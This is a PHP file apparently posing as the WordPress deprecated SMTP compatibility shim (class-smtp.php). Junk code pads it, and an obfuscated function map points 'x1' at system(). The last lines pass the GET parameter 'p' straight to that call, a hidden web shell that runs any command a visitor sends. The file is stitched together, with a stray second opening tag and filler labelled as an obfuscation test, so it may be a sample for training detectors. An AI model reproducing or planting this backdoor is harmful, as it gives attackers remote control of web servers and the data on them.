<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * The SMTP class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
 */
_deprecated_file(
	basename( __FILE__ ),
	'5.5.0',
	WPINC . '/PHPMailer/SMTP.php',
	__( 'The SMTP class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.' )
);

require_once __DIR__ . '/PHPMailer/SMTP.php';

class_alias( PHPMailer\PHPMailer\SMTP::class, 'SMTP' );

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>